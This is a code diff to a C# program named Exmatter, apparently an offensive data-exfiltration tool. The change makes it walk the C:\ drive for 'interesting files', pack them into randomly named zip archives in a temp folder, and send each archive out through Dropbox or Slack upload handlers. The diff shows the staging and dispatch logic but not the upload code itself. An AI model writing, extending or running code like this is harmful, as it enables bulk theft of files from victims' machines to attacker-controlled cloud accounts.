@@ -1,4 +1,6 @@
 ﻿using System;
+using System.CodeDom;
+using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
 using System.Linq;
@@ -49,7 +51,7 @@ namespace Exmatter
 
         }
 
-        static public string HandleFileStager(string[] args)
+        static public List<string> HandleFileStager(string[] args)
         {
             // Help stuff
             if (args.Length < 3 && args[0].ToLower().Equals("slack"))
@@ -72,12 +74,13 @@ namespace Exmatter
             string randomString = new string(Enumerable.Repeat(chars, 8)
               .Select(s => s[random.Next(s.Length)]).ToArray());
             string outputFilePath = Path.Combine(tempFolderPath, $"{randomString}.zip");
-            
+
+
             var fileStager = new FileStager(@"C:\", outputFilePath);
             // Walks directory & makes zip
-            string zipFilePath = fileStager.Go();
+            List<string> zipFilePaths = fileStager.Go();
 
-            return zipFilePath;
+            return zipFilePaths;
         }
 
 
@@ -93,37 +96,55 @@ namespace Exmatter
                 Environment.Exit(1);
             }
 
-            // dropbox | slack
-            var subCommand = args[0].ToLower();
-
+           
             // filePath | autozip
             if (args.Length >= 2 && args[1].ToLower().Equals("autozip"))
             {
-                Console.WriteLine("do autozip");
-                string zipFilePath = HandleFileStager(args);
-                args[1] = zipFilePath; 
+                Console.WriteLine("[+] Walking directory for interesting files... ");
+                List<string> zipFilePaths = HandleFileStager(args);
+                foreach (var zipFilePath in zipFilePaths)
+                {
+                    // replace command line switch with a file path
+                    args[1] = zipFilePath;
+                    // dropbox | slack
+                    switch (args[0].ToLower())
+                    {
+                        case "dropbox":
+                            await HandleDropboxCommand(args);
+                            break;
+
+                        case "slack":
+                            await HandleSlackCommand(args);
+                            break;
+
+                        default:
+                            Console.WriteLine($"[!] Unknown sub-command: {args[0].ToLower()}");
+                            Console.WriteLine("Available sub-commands: dropbox, slack");
+                            Environment.Exit(1);
+                            break;
+                    }
+                }
             }
-
-            
-
-            switch (subCommand)
+            else
             {
-                case "dropbox":
-                    await HandleDropboxCommand(args);
-                    break;
+                // dropbox | slack
+                switch (args[0].ToLower())
+                {
+                    case "dropbox":
+                        await HandleDropboxCommand(args);
+                        break;
 
-                case "slack":
-                    await HandleSlackCommand(args);
-                    break;
+                    case "slack":
+                        await HandleSlackCommand(args);
+                        break;
 
-                default:
-                    Console.WriteLine($"[!] Unknown sub-command: {subCommand}");
-                    Console.WriteLine("Available sub-commands: dropbox, slack");
-                    Environment.Exit(1);
-                    break;
-            }
-
-           
+                    default:
+                        Console.WriteLine($"[!] Unknown sub-command: {args[0].ToLower()}");
+                        Console.WriteLine("Available sub-commands: dropbox, slack");
+                        Environment.Exit(1);
+                        break;
+                }
+            }           
         }
     }
 }
